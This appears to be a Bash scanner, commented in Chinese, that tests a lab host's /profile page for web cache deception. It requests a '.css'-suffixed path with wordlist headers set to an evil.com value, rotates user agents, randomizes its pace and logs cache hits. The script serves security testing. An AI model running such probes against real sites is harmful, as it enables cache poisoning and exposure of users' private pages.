#!/bin/bash

# Web缓存欺骗测试脚本
# 使用param_miner_lowercase_headers.txt中的头部测试缓存欺骗漏洞

# 配置参数
TARGET_URL="https://192.168.139.141/profile"  # 目标URL（通常为用户敏感页面）
DURATION=300                            # 测试持续时间(秒)
BASE_RATE=2                             # 基础请求速率(请求/秒)
LOG_FILE="cache_deception_test_$(date +%Y%m%d_%H%M%S).log"
HEADERS_FILE="param_miner_lowercase_headers.txt"

# 用户代理列表
USER_AGENTS=(
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15"
  "curl/7.68.0"
)

# 检查头部文件是否存在
if [ ! -f "$HEADERS_FILE" ]; then
  echo "错误: 头部文件 $HEADERS_FILE 不存在!"
  exit 1
fi

# 读取头部文件
mapfile -t HEADERS < "$HEADERS_FILE"

# 初始化日志文件
echo "Web缓存欺骗测试报告 - $(date)" > $LOG_FILE
echo "目标URL: $TARGET_URL" >> $LOG_FILE
echo "头部文件: $HEADERS_FILE" >> $LOG_FILE
echo "开始时间: $(date +%T)" >> $LOG_FILE
echo "----------------------------------------" >> $LOG_FILE

# 主扫描函数
start_scan() {
  local start_time=$(date +%s)
  local end_time=$((start_time + DURATION))
  local current_time=$(date +%s)
  local request_count=0
  local potential_hits=0
  
  while [ $current_time -lt $end_time ]; do
    # 随机选择头部和用户代理
    local random_header=${HEADERS[$RANDOM % ${#HEADERS[@]}]}
    local user_agent=${USER_AGENTS[$RANDOM % ${#USER_AGENTS[@]}]}
    
    # 随机请求速率(基础速率±1)
    local current_rate=$((BASE_RATE + (RANDOM % 3) - 1))
    [ $current_rate -lt 1 ] && current_rate=1
    
    # 构建恶意路径和头部
    local test_url="$TARGET_URL/test.css"  # 添加静态文件扩展名
    local header_value="http://evil.com/?cachebuster=$RANDOM"
    
    # 发送请求
    echo "[$(date +%T)] 测试 #$((++request_count)): $random_header: $header_value" | tee -a $LOG_FILE
    
    # 使用curl发送带有特殊头部的请求
    local response=$(curl -k -s -v --http3\
      -A "$user_agent" \
      -H "$random_header: $header_value" \
      "$test_url" 2>&1)
    
    # 检查响应中的缓存相关头部
    echo "$response" | grep -E '^< HTTP|Age:|X-Cache|Cache-Control|Vary:' >> $LOG_FILE
    
    # 检测可能的缓存命中
    if echo "$response" | grep -q -E 'X-Cache: HIT|Age: [0-9]'; then
      echo "[!] 可能的缓存欺骗漏洞: $random_header" >> $LOG_FILE
      ((potential_hits++))
    fi
    
    # 随机延迟控制速率
    sleep $(awk "BEGIN {print (1/$current_rate) + (($RANDOM%1000)/2000)}")
    
    current_time=$(date +%s)
  done
  
  echo "----------------------------------------" >> $LOG_FILE
  echo "扫描完成" >> $LOG_FILE
  echo "总请求数: $request_count" >> $LOG_FILE
  echo "潜在漏洞发现: $potential_hits" >> $LOG_FILE
  echo "平均速率: $((request_count / DURATION)) 请求/秒" >> $LOG_FILE
}

# 执行扫描
start_scan

# 结果摘要
echo -e "\n潜在Web缓存欺骗漏洞摘要:"
grep -B2 -i "可能的缓存欺骗漏洞" $LOG_FILE | sort | uniq -c | sort -nr

echo -e "\n缓存响应统计:"
grep -E 'X-Cache|Age:' $LOG_FILE | sort | uniq -c | sort -nr
